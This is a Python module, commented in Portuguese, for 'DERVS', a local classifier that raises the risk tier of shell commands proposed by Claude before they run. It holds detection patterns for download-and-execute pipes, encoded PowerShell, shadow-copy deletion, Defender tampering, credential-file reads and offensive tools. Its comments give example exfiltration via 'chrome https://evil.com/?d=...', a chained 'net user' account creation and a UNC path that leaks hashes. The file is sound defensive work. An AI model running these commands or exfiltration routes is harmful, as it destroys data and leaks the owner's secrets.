#!/usr/bin/env python3
"""DERVS — rede de segurança local.

Esta é a peça que dá a PALAVRA FINAL sobre o risco de um comando. O cérebro
(Claude) sugere um nível de risco; aqui a máquina confere e pode SUBIR esse
nível, nunca descer. Motivo: a resposta do Claude também vem "de fora", e a
regra da casa é tratar o que vem de fora como suspeito até provar o contrário.

Três trilhos de risco, do mais manso ao mais perigoso:
  - "reversivel"   → abrir app, listar, ler. Um Confirmar só.
  - "muda_estado"  → instala, edita, cria. Confirma com o comando à vista.
  - "destrutivo"   → apaga, formata, OU toca um alvo de rede real. Dupla
                     confirmação; e, se toca alvo, também pergunta de autorização.

Tudo aqui é função pura (entra texto, sai decisão) de propósito: é o que dá
para testar sem abrir tela nem rodar nada de verdade.
"""
import re

# Ordem dos trilhos — o índice serve para comparar "qual é o mais alto".
NIVEIS = ["reversivel", "muda_estado", "destrutivo"]


def _nivel_max(a: str, b: str) -> str:
    """Devolve o trilho mais alto entre dois. É como a máquina SOBE o risco
    sem nunca descer: o final é sempre o maior entre o que o Claude disse e o
    que a lista local achou."""
    ia = NIVEIS.index(a) if a in NIVEIS else 0
    ib = NIVEIS.index(b) if b in NIVEIS else 0
    return NIVEIS[max(ia, ib)]


# --- comandos que APAGAM/QUEBRAM: forçam o trilho destrutivo -------------------
# Cada par é (padrão de regex, motivo em português para mostrar ao usuário).
_DESTRUTIVOS = [
    (r"\brm\s+(-\w*\s+)*-?\w*[rf]", "apaga arquivos ou pastas"),
    (r"\brmdir\b", "remove diretório"),
    (r"\b(shred|wipe|wipefs)\b", "destrói dados de forma irreversível"),
    (r"\bdd\b.*\bof=", "escreve direto no disco (pode destruir o sistema)"),
    (r"\bmkfs", "formata (apaga tudo do dispositivo)"),
    (r"\b(fdisk|parted|sgdisk|gdisk)\b", "mexe na tabela de partições do disco"),
    (r">\s*/dev/(sd|nvme|mmc|disk)", "escreve por cima de um disco"),
    (r"of=/dev/(sd|nvme|mmc|disk)", "escreve por cima de um disco"),
    (r":\(\)\s*\{.*\|.*&.*\}", "fork bomb — trava a máquina"),
    (r"\bmv\b.+/dev/null", "joga arquivo fora (perde o conteúdo)"),
    (r"\bchmod\s+-\w*[Rr]\b.+\s/(\s|$)", "muda permissão da raiz do sistema"),
    (r"\bchown\s+-\w*[Rr]\b.+\s/(\s|$)", "muda dono da raiz do sistema"),
    (r"\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b", "apaga tabela/banco inteiro"),
    (r"\bDELETE\s+FROM\b(?!.*\bWHERE\b)", "apaga todas as linhas da tabela"),
    (r"\bgit\s+reset\s+--hard\b", "descarta mudanças sem volta"),
    (r"\bgit\s+clean\s+-\w*[fdx]", "apaga arquivos não versionados"),
    (r"\bgit\s+push\s+.*--force", "reescreve o histórico remoto"),
    (r"\b(shutdown|reboot|poweroff|halt)\b", "desliga ou reinicia a máquina"),
    (r"\bsystemctl\s+(stop|disable|mask)\b", "derruba um serviço"),
    (r"\b(kill|pkill|killall)\b\s+-9", "mata processo à força"),
    (r"\bcrontab\s+-r\b", "apaga todas as tarefas agendadas"),
    (r"\bdocker\b.+\b(down\s+-v|system\s+prune|rm\s+-f|volume\s+rm)", "remove contêineres/volumes"),
    (r"\b(iptables|nft)\b.+\s-F\b", "zera as regras de firewall"),
    (r"\bcurl\b.+\|\s*(sudo\s+)?(sh|bash)\b", "baixa e executa código da internet às cegas"),
    (r"\bwget\b.+\|\s*(sudo\s+)?(sh|bash)\b", "baixa e executa código da internet às cegas"),

    # --- Windows (PowerShell/cmd): a máquina do dono agora é Windows, e a
    # rede não pode ficar cega fora do vocabulário Linux. -------------------
    (r"\b(Remove-Item|ri|rm|del|erase)\b.*(-Recurse|-Force|/f\b|/s\b|/q\b)",
     "apaga arquivos ou pastas (PowerShell/cmd)"),
    (r"\bdel\s+/f\b|\bdel\s+/s\b|\bdel\s+/q\b|\berase\s+/s\b",
     "apaga arquivos em lote (cmd)"),
    (r"\b(rd|rmdir)\s+/s\b", "remove diretório e conteúdo (cmd)"),
    (r"\bformat\s+\w:", "formata um disco (apaga tudo dele)"),
    (r"\bdiskpart\b", "abre a ferramenta de partições do Windows"),
    (r"\bclean\s+all\b", "limpa a tabela de partições (diskpart)"),
    (r"\bcipher\s+/w", "sobrescreve o espaço livre do disco"),
    (r"\bvssadmin\b.+\bdelete\b.+\bshadows\b", "apaga os pontos de restauração (clássico de ransomware)"),
    (r"\bbcdedit\b", "altera a configuração de boot"),
    (r"\bbootrec\b", "reescreve o setor de boot"),
    (r"\breg\s+delete\s+HK(LM|CU)\b", "apaga uma chave do registro do Windows"),
    (r"\b(Stop-Computer|Restart-Computer)\b", "desliga ou reinicia a máquina (PowerShell)"),
    (r"\bshutdown\s+/(s|r|f)\b", "desliga ou reinicia a máquina (cmd)"),
    (r"\bStop-Service\b", "derruba um serviço do Windows"),
    (r"\bsc\s+(delete|stop)\b", "apaga ou para um serviço do Windows"),
    (r"\btaskkill\s+/f\b", "mata processo à força (Windows)"),
    (r"\bSet-ExecutionPolicy\s+(Bypass|Unrestricted)\b", "afrouxa a política de execução de scripts"),
    # `irm` (Invoke-RestMethod) faltava aqui, e era o único da família que
    # escapava — justamente o apelido mais usado. `irm ... | iex` é a linha com
    # que quase todo malware de Windows entra hoje. Achado rodando o
    # classificador na revisão de 02/09/2026.
    (r"\b(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl|wget)\b"
     r".*\|\s*(Invoke-Expression|iex)\b",
     "baixa e executa código da internet às cegas (PowerShell)"),
    (r"\biex\s*\(", "executa código dinamicamente (PowerShell)"),
    (r"\bInvoke-Expression\b", "executa código dinamicamente (PowerShell)"),
    (r"\bRemove-Item\b.+(C:\\\\?Windows|C:\\\\?Program Files|\$env:SystemRoot)",
     "apaga uma pasta de sistema do Windows"),
    (r"\btakeown\s+/f\s+C:\\?\s+/r", "toma posse da raiz do disco C:"),
    (r"\bicacls\s+C:\\?\s+.*\bgrant\b.*\s/t\b", "reescreve permissões da raiz do disco C:"),

    # --- Windows, segunda rodada: buracos achados rodando o classificador ----
    # O PowerShell aceita QUALQUER prefixo não-ambíguo de parâmetro (-Rec, -Fo),
    # então nada aqui pode exigir a flag por extenso.
    (r"\b(del|erase|Remove-Item|ri)\b[^|;]*\*", "apaga vários arquivos por coringa"),
    (r"\|[^|]*\b(Remove-Item|ri|del|erase)\b",
     "apaga o que vier pelo cano — a quantidade é imprevisível"),
    (r"(?<![\w-])-e(?:nc\w*)?\s+\S", "roda comando codificado em base64 (esconde o que faz)"),
    (r"(?:^|[;|(&]|\|\|)\s*&\s*['\"]?[A-Za-z]:[\\/]",
     "executa um programa direto pelo caminho (operador de chamada)"),
    (r"-Verb\s+RunAs\b", "roda como administrador (eleva privilégio)"),
    (r"\b(Add|Set|Remove)-MpPreference\b", "mexe na proteção do Windows Defender"),
    (r"\bwevtutil\s+cl\b", "apaga o registro de eventos do Windows"),
    (r"\bClear-EventLog\b", "apaga o registro de eventos do Windows"),
    (r"\bnet\s+(user|localgroup)\b\s+\S", "mexe em contas ou grupos de usuário"),
    (r"\b(New-LocalUser|Add-LocalGroupMember|Set-LocalUser)\b",
     "mexe em contas ou grupos de usuário (PowerShell)"),
    (r"\bschtasks\b[^|;]*/(create|change|delete)\b", "cria ou altera tarefa agendada (persistência)"),
    (r"\b(Register-ScheduledTask|New-ScheduledTask\w*)\b",
     "cria tarefa agendada (persistência)"),
    (r"\brobocopy\b[^|;]*\s/(mir|purge)\b", "espelha pastas — apaga o que sobra no destino"),
    (r"\bWin32_Process\b", "cria processo por WMI/CIM (contorna o caminho normal)"),
    (r"\b(wmic|Invoke-WmiMethod)\b[^|;]*\bprocess\b[^|;]*\bcall\b[^|;]*\bcreate\b",
     "cria processo por WMI (contorna o caminho normal)"),
]

# Prefixo não-ambíguo de -Recurse e -Force: o PowerShell aceita -Rec, -Recu, -Fo…
_FLAG_RECURSE_FORCE = r"(?<![\w-])-(?:r(?:e(?:c(?:u(?:r(?:s(?:e)?)?)?)?)?)?|f(?:o(?:r(?:c(?:e)?)?)?)?)\b"

# Pares "as duas coisas na mesma linha, em qualquer ordem". Serve para os casos
# em que a flag vem ANTES do verbo (pipeline: gci -Recurse | Remove-Item).
_DESTRUTIVOS_COMBO = [
    (r"\b(Remove-Item|ri|rm|del|erase)\b", _FLAG_RECURSE_FORCE,
     "apaga arquivos ou pastas (PowerShell/cmd)"),
    (r"\b(Copy-Item|copy|cp|Move-Item|move|mv)\b", _FLAG_RECURSE_FORCE,
     "copia/move por cima de arquivo existente (perde o conteúdo antigo)"),
]

# --- arquivos de segredo: ler já é grave, porque a saída vai para a nuvem ------
# A saída do comando entra na conversa e é mandada ao modelo no turno seguinte.
# Ler continua sendo permitido, mas no trilho de cima e pedindo autorização.
_SEGREDOS = [
    r"\.env\b", r"\.ssh\b", r"\bid_(rsa|dsa|ecdsa|ed25519)\b", r"\bid_\w+\.pub\b",
    r"\bcredentials\b", r"\.pem\b", r"\.key\b", r"\.pfx\b", r"\.p12\b",
    r"\.aws\b", r"\.gnupg\b", r"\bunattend\.xml\b", r"\bNTDS\.dit\b",
    r"\bSAM\b", r"\bSYSTEM\.sav\b", r"/etc/shadow\b", r"\bshadow\b",
    r"\.npmrc\b", r"\.pypirc\b", r"\.git-credentials\b",
    r"\bLogin Data\b", r"\bCookies\b", r"\.kdbx\b",
]

# --- ferramentas/ações que TOCAM UM ALVO DE REDE: pedem autorização ------------
# Se aparece qualquer uma, o trilho vira destrutivo E o DERVS pergunta se é
# laboratório/alvo próprio ou se há autorização por escrito (regra 0 da casa).
_FERRAMENTAS_ALVO = [
    r"\bnmap\b", r"\bmasscan\b", r"\bnaabu\b", r"\brustscan\b", r"\bzmap\b",
    r"\bnikto\b", r"\bwpscan\b", r"\bsqlmap\b", r"\bffuf\b", r"\bgobuster\b",
    r"\bferoxbuster\b", r"\bdirb\b", r"\bhydra\b", r"\bmedusa\b", r"\bpatator\b",
    r"\bwifite\b", r"\baircrack-ng\b", r"\bairodump-ng\b", r"\bairmon-ng\b",
    r"\baireplay-ng\b", r"\bhcxdumptool\b", r"\breaver\b", r"\bbettercap\b",
    r"\bettercap\b", r"\bresponder\b", r"\bmitm6\b", r"\bntlmrelayx",
    r"\bnetexec\b", r"\bnxc\b", r"\bcrackmapexec\b", r"\bimpacket-", r"\bsecretsdump",
    r"\bmsfconsole\b", r"\bmetasploit\b", r"\bmsfvenom\b", r"\bsliver\b",
    r"\bsubfinder\b", r"\bamass\b", r"\bhttpx\b", r"\bhttprobe\b", r"\bwafw00f\b",
    r"\benum4linux\b", r"\bcrackmapexec\b", r"\bcertipy\b", r"\bcoercer\b",
    r"\bevil-winrm\b", r"\bproxychains\d*\b", r"\bsslscan\b", r"\btestssl",
]

# Sinais mais genéricos de "estou falando com uma máquina lá fora".
_REDE_GENERICA = [
    (r"\bssh\s+\w+@", "conecta numa máquina remota"),
    (r"\bscp\b.+@", "copia arquivo de/para máquina remota"),
    # Antes só `curl` e `wget` contavam aqui, e o "alvo" só era reconhecido
    # quando o endereço vinha em NÚMERO — domínio nunca contava. Resultado
    # medido em 02/09/2026: mandar o conteúdo de um arquivo do dono por POST
    # para um servidor lá fora era "um clique", sem a pergunta de autorização.
    (r"\b(curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm)\b"
     r".+https?://(?!localhost|127\.0\.0\.1|\[::1\])",
     "acessa um endereço na internet"),
    (r"\b(Test-NetConnection|tnc|Test-Connection|New-PSSession|Enter-PSSession)\s+"
     r"(?!localhost\b|127\.0\.0\.1\b)[\w.-]*[A-Za-z][\w.-]*\.[A-Za-z]{2,}",
     "sonda ou abre sessão numa máquina lá fora"),
]

# --- IP: só conta como "alvo" quando é argumento de ferramenta de rede --------
# Antes, qualquer coisa parecida com IPv4 virava cartão vermelho: "abre o
# roteador" (192.168.0.1) e uma busca com número de versão (24.2.1.0) pediam
# autorização. Cartão vermelho à toa treina o dono a confirmar no automático —
# e aí o "sim" que importa também vem no automático.
_FERRAMENTAS_DE_REDE = re.compile(
    r"\b(ssh|scp|sftp|ftp|telnet|ping|tracert|traceroute|pathping|"
    r"curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|"
    r"nc|ncat|netcat|socat|mstsc|rdesktop|"
    r"Test-NetConnection|tnc|Test-Connection|New-PSSession|Enter-PSSession)\b",
    re.IGNORECASE,
)

# IPv4 solto: nem colado em palavra maior, nem com um quinto grupo (versão).
_IPV4 = re.compile(r"(?<![\w.+-])(\d{1,3}(?:\.\d{1,3}){3})(?![\w.+-])")

# Faixas de casa: rede privada e loopback não são "alvo lá fora".
_IP_PRIVADO = re.compile(
    r"^(?:10\.|127\.|0\.|169\.254\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)"
)


def _tem_ip_publico(comando: str) -> bool:
    for ip in _IPV4.findall(comando):
        if not _IP_PRIVADO.match(ip):
            return True
    return False

# --- comandos claramente inofensivos: podem ficar no trilho reversível ---------
# Só o que está aqui pode ser "reversível". Qualquer coisa fora desta lista e
# fora da lista de destrutivos cai em "muda_estado" — ou seja, no MÍNIMO pede
# uma confirmação. Assim um comando novo/desconhecido nunca roda sozinho.
#
# ATENÇÃO: os padrões abaixo são ancorados no INÍCIO da linha (ver _casa_seguro).
# Sem âncora, "notepad && net user invasor 123 /add" casava \bnotepad\b e virava
# reversível; e \btype\b casava Add-Type, \bstart\b casava Start-Process,
# \bfile\b casava Out-File, \bwhere\b casava Where-Object.
_SEGUROS = [
    r"ls\b", r"cat\b", r"less\b", r"head\b", r"tail\b", r"echo\b",
    r"pwd\b", r"cd\b", r"whoami\b", r"id\b", r"date\b", r"uname\b",
    r"which\b", r"type\b", r"ps\b", r"top\b", r"htop\b", r"df\b",
    r"du\b", r"free\b", r"grep\b", r"find\b", r"file\b", r"stat\b",
    r"history\b", r"env\b", r"printenv\b", r"wc\b", r"sort\b",
    r"uniq\b", r"git\s+(status|log|diff|branch|show)\b",
    r"xdg-open\b", r"konsole\b", r"firefox\b", r"chromium\b",
    r"code\b", r"nautilus\b", r"dolphin\b",
    # Windows (PowerShell/cmd) — só leitura ou abrir app de tela.
    r"dir\b", r"Get-ChildItem\b", r"gci\b", r"Get-Content\b", r"gc\b",
    r"Get-Location\b", r"Get-Date\b", r"Get-Process\b", r"Test-Path\b",
    r"where\b", r"hostname\b", r"systeminfo\b",
    r"ipconfig\b", r"explorer\b", r"notepad\b", r"calc\b", r"wt\b",
    r"chrome\b", r"msedge\b", r"start\b",
]

# Encadeamento e invocação: qualquer um destes DERRUBA a whitelist inteira.
# Um comando "seguro" que emenda outro não é seguro — o segundo é que manda.
_ENCADEIA = re.compile(
    r"[;&|`^\n>]"         # ; & && | || ` ^ quebra de linha e > (ver abaixo)
    r"|\$\("               # $(...)  subexpressão
    r"|(?<![\w-])-e(?:nc\w*)?\b",  # -enc / -EncodedCommand
    re.IGNORECASE,
)

# Por que `>` entrou na lista acima: `echo hax > C:\...\importante.txt` apaga o
# conteúdo anterior do arquivo sem avisar, e saía como "reversível" — o único
# trilho que o DERVS aceita confirmar por VOZ. "Reversível" quer dizer "só
# abre, lista, lê"; redirecionar DESTRÓI. Achado na revisão de 02/09/2026.

# Argumento que tira um comando "seguro" da lista de seguros.
# `explorer`, `chrome`, `start` e afins são inofensivos abrindo uma pasta ou
# uma tela — e perigosos abrindo um executável ou um endereço lá fora:
#   - `start C:\...\a.exe` roda um binário qualquer (e era "reversível", ou
#     seja, bastava um som na sala para confirmar por voz);
#   - `chrome https://evil.com/?d=<dados>` é um cano de saída: o cérebro tem a
#     conversa inteira no contexto e sabe montar a URL;
#   - `explorer \\host\share` no Windows dispara autenticação para o servidor
#     remoto, entregando o hash da senha do dono.
#
# ONDE ESTÁ A LINHA, e por quê: `chrome https://google.com` continua manso.
# "Abre o YouTube" é uso diário do dono, e cartão vermelho à toa treina ele a
# confirmar no automático — aí o "sim" que importa também vem no automático.
# O que sobe de trilho é a URL que CARREGA DADO: qualquer `?` ou `#` nela. É
# ali que a conversa dele caberia. Custo desta escolha, dito com todas as
# letras: uma busca montada como `...google.com/search?q=gatos` passa a pedir
# um clique, e um endereço que esconda o dado no caminho (sem `?`) escapa.
_URL = re.compile(r"https?://\S+", re.IGNORECASE)
_URL_COM_DADO = re.compile(r"https?://\S*[?#]", re.IGNORECASE)
_CAMINHO_DE_REDE = re.compile(r"(?:^|\s)\\\\[^\\\s]")
# `com` ficou DE FORA de propósito: `.com` é extensão de executável do DOS, mas
# também é o fim de quase todo endereço da internet — e `chrome google.com`
# virava cartão vermelho. Alarme falso é o que treina o dono a dizer "sim" sem
# ler.
_ARQUIVO_QUE_EXECUTA = re.compile(
    r"\.(?:exe|msi|bat|cmd|scr|vbs|vbe|js|jse|wsf|wsh|ps1|psm1|hta|lnk|reg|jar)"
    r"(?:\s|\"|'|$)",
    re.IGNORECASE,
)


def _argumento_perigoso(comando: str) -> bool:
    if _URL_COM_DADO.search(comando) or _CAMINHO_DE_REDE.search(comando):
        return True
    # As URLs saem da conta antes de procurar extensão executável: sem isso,
    # `https://algumsite.js/...` no meio de um endereço acusaria à toa.
    return bool(_ARQUIVO_QUE_EXECUTA.search(_URL.sub(" ", comando)))


def _casa(comando: str, padroes) -> bool:
    return any(re.search(p, comando, re.IGNORECASE) for p in padroes)


def _casa_seguro(comando: str) -> bool:
    """A whitelist só vale para a linha INTEIRA: o comando tem de COMEÇAR com
    um dos nomes seguros e não pode encadear nem invocar mais nada."""
    if _ENCADEIA.search(comando):
        return False
    if _argumento_perigoso(comando):
        return False
    return any(re.match(r"\s*(?:" + p + r")", comando, re.IGNORECASE) for p in _SEGUROS)


def classificar_local(comando: str) -> dict:
    """A palavra final da máquina sobre UM comando.

    Devolve:
      piso        — o trilho MÍNIMO que a máquina exige (o Claude pode subir).
      toca_alvo   — True se o comando fala com uma rede/alvo real.
      le_segredo  — True se o comando mexe em arquivo de segredo (chave, .env…).
      motivos     — lista de frases em português explicando o porquê.
    """
    comando = (comando or "").strip()
    motivos = []
    toca_alvo = False
    piso = "reversivel"

    # 1) É destrutivo? (apaga/quebra) — sobe direto para o topo.
    for padrao, motivo in _DESTRUTIVOS:
        if re.search(padrao, comando, re.IGNORECASE):
            piso = "destrutivo"
            motivos.append(motivo)

    # 1b) Verbo e flag na mesma linha, em qualquer ordem (o pipeline do
    #     PowerShell separa os dois: "gci -Recurse | Remove-Item").
    for verbo, flag, motivo in _DESTRUTIVOS_COMBO:
        if re.search(verbo, comando, re.IGNORECASE) and re.search(flag, comando, re.IGNORECASE):
            piso = "destrutivo"
            motivos.append(motivo)

    # 1c) Mexe em arquivo de segredo? Ler já basta: a saída entra na conversa e
    #     vai para o modelo na nuvem no turno seguinte.
    le_segredo = _casa(comando, _SEGREDOS)
    if le_segredo:
        piso = "destrutivo"
        motivos.append("mexe em arquivo de segredo (chave, senha, credencial) — "
                       "a saída pode vazar para fora da máquina")

    # 2) Toca um alvo de rede? — topo também, e marca para pedir autorização.
    if _casa(comando, _FERRAMENTAS_ALVO):
        toca_alvo = True
        motivos.append("usa ferramenta que toca um alvo de rede")
    for padrao, motivo in _REDE_GENERICA:
        if re.search(padrao, comando, re.IGNORECASE):
            toca_alvo = True
            motivos.append(motivo)
    # IP só é alvo quando é argumento de ferramenta de rede E não é faixa de casa.
    if _FERRAMENTAS_DE_REDE.search(comando) and _tem_ip_publico(comando):
        toca_alvo = True
        motivos.append("aponta para um endereço de rede (IP)")
    if toca_alvo:
        piso = _nivel_max(piso, "destrutivo")

    # 3) Não é perigoso nem toca alvo: é reconhecidamente inofensivo?
    #    Se não for da lista de seguros, exige no mínimo uma confirmação.
    if piso == "reversivel" and not toca_alvo:
        if not _casa_seguro(comando):
            piso = "muda_estado"
            motivos.append("comando não reconhecido como inofensivo — confirmar por garantia")

    return {"piso": piso, "toca_alvo": toca_alvo, "le_segredo": le_segredo,
            "motivos": motivos}


def decidir_risco(comando: str, risco_do_claude: str = "reversivel") -> dict:
    """Junta a opinião do Claude com a palavra final da máquina.

    O trilho final é sempre o MAIOR entre os dois — a máquina só sobe, nunca
    desce o risco. Devolve tudo que a tela precisa para montar o cartão de
    confirmação.
    """
    local = classificar_local(comando)
    final = _nivel_max(local["piso"], risco_do_claude or "reversivel")
    return {
        "nivel": final,
        "toca_alvo": local["toca_alvo"],
        "le_segredo": local["le_segredo"],
        # Segredo também pede o "tenho autorização": é dado que pode vazar.
        "precisa_autorizacao": local["toca_alvo"] or local["le_segredo"],
        "dupla_confirmacao": final == "destrutivo",
        "motivos": local["motivos"],
        "risco_claude": risco_do_claude,
        "piso_local": local["piso"],
    }


if __name__ == "__main__":
    # Demonstração rápida no terminal: python3 dervs_safety.py
    for c in ["ls -la", "pip install requests", "rm -rf /home/user/x",
              "nmap -sV 10.0.0.5", "wifite --kill", "echo oi"]:
        print(f"{c!r:40} -> {decidir_risco(c)}")
